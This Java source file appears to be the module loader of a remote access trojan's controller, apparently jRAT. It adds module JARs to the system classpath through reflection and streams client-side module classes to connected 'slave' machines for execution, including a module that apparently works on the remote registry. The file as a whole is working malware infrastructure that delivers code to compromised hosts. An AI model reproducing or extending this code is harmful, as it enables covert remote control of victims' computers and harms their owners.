package jrat.controller.modules;

import apiv2.ControllerModule;
import jrat.common.Logger;
import jrat.controller.AbstractSlave;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class ModuleLoader {

    /**
     * Temporary class that holds necessary module data
     */
    private static class ModuleData {

        public boolean controller;
        public String path;
        public String mainClass;

        public ModuleData(boolean controller, String path, String mainClass) {
            this.controller = controller;
            this.path = path;
            this.mainClass = mainClass;
        }
    }

    private static final List<ModuleData> local = new ArrayList<ModuleData>();
    private static final List<ModuleData> modules = new ArrayList<ModuleData>();

    static {
        local.add(new ModuleData(true, "registry-controller.jar", "jrat.module.registry.RegistryControllerModule"));
        modules.add(new ModuleData(false, "registry-client.jar", "jrat.module.registry.RegistryClientModule"));
    }

    /**
     * Load all server side modules
     * @throws Exception
     */
    public static void load() throws Exception {
        for (ModuleData mod : local) {
            // add module JAR to classpath
            Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            method.setAccessible(true);
            method.invoke(ClassLoader.getSystemClassLoader(), new File("modules", mod.path).toURI().toURL());

            // invoke init() on module
            Class<ControllerModule> clazz = (Class<ControllerModule>) ModuleLoader.class.getClassLoader().loadClass(mod.mainClass);
            Constructor<?> ctor = clazz.getDeclaredConstructor(null);
            ctor.setAccessible(true);
            ControllerModule module = (ControllerModule) ctor.newInstance(null);
            module.init();
        }
    }

    /**
     * Send all client side modules to the client
     * @param slave
     * @throws Exception
     */
    public static void send(AbstractSlave slave) throws Exception {
        Logger.log("Writing " + modules.size() + " modules...");
        slave.writeInt(modules.size());

        for (ModuleData mod : modules) {
            slave.writeLine(mod.mainClass);

            int total = 0;

            JarInputStream jis = new JarInputStream(new FileInputStream(new File("modules", mod.path)));
            JarEntry entry;
            while ((entry = jis.getNextJarEntry()) != null) {
                int size = (int) entry.getSize();

                if (size == 0) {
                    continue;
                }

                ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

                int count;
                byte[] buffer = new byte[1024];
                while ((count = jis.read(buffer)) != -1) {
                    out.write(buffer, 0, count);
                }

                out.close();

                byte[] array = out.toByteArray();
                total += array.length;

                Logger.log("\twriting class " + entry.getName() + " (" + array.length + " b)");

                slave.writeBoolean(true);
                slave.writeLine(entry.getName());
                slave.writeInt(array.length);
                slave.getDataOutputStream().write(array);
            }
            jis.close();

            // indicate that there are no entries left for this module
            slave.writeBoolean(false);
            Logger.log("\twrote module '" + mod.mainClass + "' (" + total + " b)");
        }
    }
}
